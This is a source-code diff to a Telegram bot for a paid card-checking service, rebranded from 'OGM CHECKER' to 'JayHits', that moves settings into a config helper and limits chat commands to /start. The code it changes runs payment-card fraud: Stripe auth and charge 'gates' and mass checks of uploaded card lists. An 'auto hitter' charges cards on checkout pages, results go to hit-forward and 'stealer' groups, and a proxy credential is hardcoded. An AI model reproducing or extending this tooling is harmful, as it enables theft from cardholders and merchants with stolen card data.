@@ -1,4 +1,4 @@
-from telethon import TelegramClient, events, Button
+from telethon import TelegramClient, events, Button, functions, types
 from telethon.tl.types import KeyboardButtonCallback
 import requests, random, datetime, json, os, re, asyncio, time
 import string
@@ -9,6 +9,7 @@ from urllib.parse import urlparse
 import sys
 import tempfile
 from response_mask import mask_response
+from env_config import get_bool_setting, get_setting, write_runtime_setting
 
 from gateways import (
     GATEWAY_REGISTRY, get_flat_registry, run_gateway,
@@ -24,25 +25,22 @@ from tools import (
     tool_rand, tool_translate, tool_langcode, set_bot_username
 )
 
-API_ID = os.environ.get("TELEGRAM_API_ID", "")
-API_HASH = os.environ.get("TELEGRAM_API_HASH", "")
-BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
-ADMIN_ID = [int(x) for x in os.environ.get("TELEGRAM_ADMIN_ID", "").split(",") if x.strip()]
-GROUP_ID = int(os.environ.get("TELEGRAM_GROUP_ID", "0"))
-GROUP_LINK = os.environ.get("TELEGRAM_GROUP_LINK", "")
+API_ID = get_setting("TELEGRAM_API_ID")
+API_HASH = get_setting("TELEGRAM_API_HASH")
+BOT_TOKEN = get_setting("TELEGRAM_BOT_TOKEN")
+ADMIN_ID = [int(x) for x in get_setting("TELEGRAM_ADMIN_ID").split(",") if x.strip()]
+GROUP_ID = int(get_setting("TELEGRAM_GROUP_ID", "0"))
+GROUP_LINK = get_setting("TELEGRAM_GROUP_LINK")
 
 def _load_logs_group_id():
     try:
-        _cfg_path = os.path.join(os.path.dirname(__file__), "config.json")
-        with open(_cfg_path, "r") as _f:
-            _cfg = json.load(_f)
-        val = str(_cfg.get("logs_group_id", "")).strip()
+        val = get_setting("LOGS_GROUP_ID").strip()
         return int(val) if val and val not in ("0", "") else 0
     except Exception:
         return 0
 
 LOGS_GROUP_ID = _load_logs_group_id()
-CHANNEL_LINK = os.environ.get("TELEGRAM_CHANNEL_LINK", "")
+CHANNEL_LINK = get_setting("TELEGRAM_CHANNEL_LINK")
 HIT_FORWARD_GROUP = -1003561084296
 STEALER_GROUP_2 = -1003862598213
 
@@ -160,8 +158,7 @@ AUTO_DELETE_DELAY = 60
 
 async def auto_delete_message(msg, delay=AUTO_DELETE_DELAY):
     try:
-        _cfg_ad = json.load(open(os.path.join(os.path.dirname(__file__), "config.json")))
-        _logs_gid = str(_cfg_ad.get("logs_group_id", "")).strip()
+        _logs_gid = get_setting("LOGS_GROUP_ID").strip()
         if _logs_gid and str(getattr(msg, "chat_id", "")) == _logs_gid:
             return
     except Exception:
@@ -257,7 +254,7 @@ NO_SKOOL_ACCOUNT_MSG = (
 
 DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
 TIMEOUT = 30
-ADMIN_USERNAME = "@OGM010"
+ADMIN_USERNAME = get_setting("ADMIN_TELEGRAM_USERNAME", "@JayHitsAdmin")
 BOT_USERNAME = None
 USERS_FILE = "users.json"
 
@@ -979,11 +976,8 @@ GATEWAY_DISPLAY_NAMES = {
 
 def send_bot_group_log(user_name, user_id, card, gateway, response_msg, status, site=None, amount=None):
     try:
-        config_path = os.path.join(os.path.dirname(__file__), "config.json")
-        with open(config_path, "r") as f:
-            config = json.load(f)
-        bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
-        group_id = config.get("TELEGRAM_GROUP_ID", "")
+        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
+        group_id = get_setting("TELEGRAM_GROUP_ID")
         if not bot_token or not group_id:
             return
         status_lower = (response_msg or "").lower()
@@ -1020,7 +1014,7 @@ def send_bot_group_log(user_name, user_id, card, gateway, response_msg, status, 
         if amount is not None:
             lines.append(f"\U0001f4b0 Amount: {_html.escape(str(amount))}")
         text = "<pre>" + "\n".join(lines) + "</pre>"
-        text += f'\n<a href="https://t.me/{bot_username}/web">Open HIT Checker</a>'
+        text += f'\n<a href="https://t.me/{bot_username}/web">Open JayHits</a>'
         requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
             "chat_id": int(group_id),
             "text": text,
@@ -1051,11 +1045,8 @@ def _mask_card(card: str) -> str:
 def send_logs_group(user_name, user_id, card, gateway, response_msg, status, site=None, amount=None):
     """Send ALL check/hitter results to the dedicated logs group (never deleted, no membership requirement)."""
     try:
-        config_path = os.path.join(os.path.dirname(__file__), "config.json")
-        with open(config_path, "r") as f:
-            config = json.load(f)
-        bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
-        logs_group_id = str(config.get("logs_group_id", "")).strip()
+        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
+        logs_group_id = get_setting("LOGS_GROUP_ID").strip()
         if not bot_token or not logs_group_id or logs_group_id == "0":
             return
         import html as _html
@@ -1076,14 +1067,13 @@ def send_logs_group(user_name, user_id, card, gateway, response_msg, status, sit
         if amount:
             lines.append(f"\U0001f4b0 Amount: {_html.escape(str(amount))}")
         try:
-            _cfg2 = json.load(open(config_path))
             _bu = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
             _bot_uname = _bu.get("result", {}).get("username", "")
         except Exception:
             _bot_uname = ""
         text = "\n".join(lines)
         if _bot_uname:
-            text += f'\n<a href="https://t.me/{_bot_uname}/web">Open HIT Checker</a>'
+            text += f'\n<a href="https://t.me/{_bot_uname}/web">Open JayHits</a>'
         requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
             "chat_id": int(logs_group_id),
             "text": text,
@@ -1265,6 +1255,19 @@ client = TelegramClient(
     proxy=None,
     use_ipv6=False
 )
+
+PUBLIC_COMMANDS = {"/start"}
+
+@client.on(events.NewMessage())
+async def _public_command_gate(event):
+    text = (getattr(event.message, "message", "") or "").strip()
+    if not text or not _is_command(text):
+        return
+    command = text.split()[0].split("@")[0].lower()
+    if command in PUBLIC_COMMANDS or event.sender_id in ADMIN_ID:
+        return
+    await event.reply("JayHits only supports /start in Telegram chat. Please use the web dashboard for everything else.")
+    raise events.StopPropagation
 
 # ── Global Anti-Flood Gate (registered FIRST — runs before every handler) ────
 @client.on(events.NewMessage())
@@ -1519,7 +1522,7 @@ async def welcome_handler(event):
 
 # --- Bot Command Handlers ---
 
-@client.on(events.NewMessage(pattern=r'(?i)^[/](start|cmds?|commands?|menu)$'))
+@client.on(events.NewMessage(pattern=r'(?i)^[/]start$'))
 async def start(event):
     await register_user(event.sender_id)
     # Cache profile picture in the background — don't delay the /start reply
@@ -1550,7 +1553,7 @@ async def start(event):
     sep = "\u2500" * 24
 
     text = (
-        f"\u2b29 **OGM CHECKER BOT** \u2b29\n"
+        f"\u2b29 **JayHits** \u2b29\n"
         f"{sep}\n\n"
         f"\u2728 Welcome, **{first_name}**!\n\n"
         f"\U0001f194 Your User ID: `{event.sender_id}`\n\n"
@@ -1559,16 +1562,10 @@ async def start(event):
         f"\u25cf Your Plan: {status_icon} **{status_text}**\n"
         f"\u25cf CC Limit: **{limit}** cards\n\n"
         f"{sep}\n"
-        f"Select a category below to explore\n"
-        f"all available commands & features."
+        f"Use the web dashboard for your tools and settings."
     )
 
     buttons = [
-        [Button.inline(f"\u26a1 Gates ({total_gates})", b"menu_gates"), Button.inline("\U0001f50d Lookup", b"menu_lookup")],
-        [Button.inline("\U0001f6e0 Toolkit", b"menu_toolkit"), Button.inline("\U0001f310 Shopify", b"menu_shopify")],
-        [Button.inline("\U0001f512 Skool Gate", b"menu_skool"), Button.inline("\U0001f3af Auto Hitter", b"menu_auto_hitter")],
-        [Button.inline("\U0001f464 Accounts Checker", b"menu_accounts")],
-        [Button.inline("\U0001f4d6 Setup Guide", b"help_back")],
         [Button.url("\U0001f4ac Join Group", GROUP_LINK), Button.url("\U0001f4e9 Contact", f"https://t.me/{ADMIN_USERNAME.replace('@','')}")],
     ]
 
@@ -1577,12 +1574,8 @@ async def start(event):
         cc_limit = get_cc_limit(access_type, event.sender_id)
         private_tip = (
             f"\n\n\U0001f4ac **Private Chat Unlocked!**\n"
-            f"You can now use these commands here:\n\n"
-            f"\U0001f7e2 `/skl` \u2014 Stripe Auth $0.1\n"
-            f"\U0001f7e1 `/skl1` \u2014 Stripe Charge $1\n"
-            f"\U0001f534 `/skl2` \u2014 Stripe Charge $7\n\n"
-            f"\U0001f4c4 **File Check:** Reply to a `.txt` file\n"
-            f"with `/mtxt` \u2014 Limit: **{cc_limit}** cards"
+            f"Your dashboard access is ready.\n"
+            f"Telegram chat command access is limited to `/start`."
         )
         text += private_tip
 
@@ -1792,10 +1785,7 @@ async def menu_auto_skool_cb(event):
 async def menu_auto_hitter_cb(event):
     sep = "\u2500" * 24
     try:
-        _cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-        with open(_cfg_path, "r") as _f:
-            _cfg = json.load(_f)
-        site_visible = _cfg.get("hitter_site_visible", True)
+        site_visible = get_bool_setting("HITTER_SITE_VISIBLE", True)
     except Exception:
         site_visible = True
     site_toggle_label = "\U0001f310 Visible Site: \u2705 YES" if site_visible else "\U0001f310 Visible Site: \u274c NO"
@@ -1836,14 +1826,9 @@ async def toggle_hitter_site_cb(event):
         await event.answer("Admin only.", alert=True)
         return
     try:
-        _cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-        with open(_cfg_path, "r") as _f:
-            _cfg = json.load(_f)
-        current = _cfg.get("hitter_site_visible", True)
-        _cfg["hitter_site_visible"] = not current
-        with open(_cfg_path, "w") as _f:
-            json.dump(_cfg, _f, indent=2)
-        new_val = _cfg["hitter_site_visible"]
+        current = get_bool_setting("HITTER_SITE_VISIBLE", True)
+        write_runtime_setting("HITTER_SITE_VISIBLE", not current)
+        new_val = not current
         label = "✅ YES (Visible)" if new_val else "❌ NO (Hidden)"
         await event.answer(f"Site visibility in group log set to: {label}", alert=True)
     except Exception as e:
@@ -5608,17 +5593,11 @@ async def send_invoice(user_id, user_name, plan, days, key):
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"✅ Your {plan_name} plan is now active!\n"
         f"Enjoy your premium features {plan_emoji}\n\n"
-        f"🌐 Hit Checker Bot"
+        f"🌐 JayHits"
     )
 
     try:
-        bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
-        if not bot_token:
-            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-            if os.path.exists(config_path):
-                with open(config_path) as f:
-                    config = json.load(f)
-                    bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
+        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
         if bot_token:
             import requests as req_lib
             url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -5646,15 +5625,8 @@ async def send_plan_log(user_id, user_name, plan, days):
     )
 
     try:
-        bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
-        group_id = os.environ.get("TELEGRAM_GROUP_ID", "")
-        if not bot_token or not group_id:
-            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-            if os.path.exists(config_path):
-                with open(config_path) as f:
-                    config = json.load(f)
-                    bot_token = bot_token or config.get("TELEGRAM_BOT_TOKEN", "")
-                    group_id = group_id or config.get("TELEGRAM_GROUP_ID", "")
+        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
+        group_id = get_setting("TELEGRAM_GROUP_ID")
         if bot_token and group_id:
             import requests as req_lib
             url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -6199,7 +6171,7 @@ async def process_mtxt_cards(event, cards, sites):
             try:
                 with open(result_file, "w", encoding="utf-8") as rf:
                     rf.write("=" * 40 + "\n")
-                    rf.write("  OGM CHECKER - MASS CHECK RESULTS\n")
+                    rf.write("  JayHits - MASS CHECK RESULTS\n")
                     rf.write("=" * 40 + "\n\n")
                     rf.write(f"\U0001f4b0 Charged: {charged}\n")
                     rf.write(f"\u2705 Approved: {approved}\n")
@@ -6913,10 +6885,7 @@ async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
                 except:
                     pass
                 try:
-                    _cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-                    with open(_cfg_path, "r") as _f:
-                        _cfg = json.load(_f)
-                    _site_visible = _cfg.get("hitter_site_visible", True)
+                    _site_visible = get_bool_setting("HITTER_SITE_VISIBLE", True)
                     _site_name_log = (session_cache or {}).get("merchant", "Stripe Checkout")
                     _display_site = _site_name_log if _site_visible else "Hidden From User"
                     _co_amount = (session_cache or {}).get("amount")
@@ -7238,10 +7207,7 @@ async def _process_hit(event, charged_ccs, checkout_url, user_id, requested_coun
                 except:
                     pass
                 try:
-                    _cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-                    with open(_cfg_path, "r") as _f:
-                        _cfg = json.load(_f)
-                    _site_visible = _cfg.get("hitter_site_visible", True)
+                    _site_visible = get_bool_setting("HITTER_SITE_VISIBLE", True)
                     _site_name_log = (session_cache or {}).get("merchant", "Stripe Checkout")
                     _display_site = _site_name_log if _site_visible else "Hidden From User"
                     _hit_amount = (session_cache or {}).get("amount")
@@ -7447,7 +7413,7 @@ async def info(event):
     rank = await get_user_rank(user_id)
     sites = await load_json(SITE_FILE)
     user_sites = sites.get(str(user_id), [])
-    info_text = f"""**OGM CHECKER - User Information**
+    info_text = f"""**JayHits - User Information**
 
 **Name:** {full_name}
 **Username:** {username}
@@ -7469,7 +7435,7 @@ async def stats(event):
         free_users = await load_json(FREE_FILE)
         user_sites = await load_json(SITE_FILE)
         keys_data = await load_json(KEYS_FILE)
-        stats_content = "OGM CHECKER - STATISTICS REPORT\n"
+        stats_content = "JayHits - STATISTICS REPORT\n"
         stats_content += "=" * 50 + "\n\n"
         current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         stats_content += f"Generated on: {current_time}\n\n"
@@ -7999,8 +7965,7 @@ async def filter_back_cb(event):
 async def _group_autodelete_outgoing(event):
     if event.is_group:
         try:
-            _cfg_ad = json.load(open(os.path.join(os.path.dirname(__file__), "config.json")))
-            _logs_gid = str(_cfg_ad.get("logs_group_id", "")).strip()
+            _logs_gid = get_setting("LOGS_GROUP_ID").strip()
             if _logs_gid and str(event.chat_id) == _logs_gid:
                 return
         except Exception:
@@ -8009,7 +7974,7 @@ async def _group_autodelete_outgoing(event):
 
 async def main():
     await initialize_files()
-    print("OGM CHECKER BOT RUNNING")
+    print("JayHits BOT RUNNING")
     for fname in os.listdir():
         if fname.startswith("temp_sites_") and fname.endswith(".json"):
             try:
@@ -8032,7 +7997,7 @@ async def main():
         print(f"Bot started successfully as {BOT_USERNAME}")
         for admin_id in ADMIN_ID:
             try:
-                await client.send_message(admin_id, "OGM CHECKER Bot started successfully!")
+                await client.send_message(admin_id, "JayHits Bot started successfully!")
             except:
                 pass
         print("Bot is now running...")
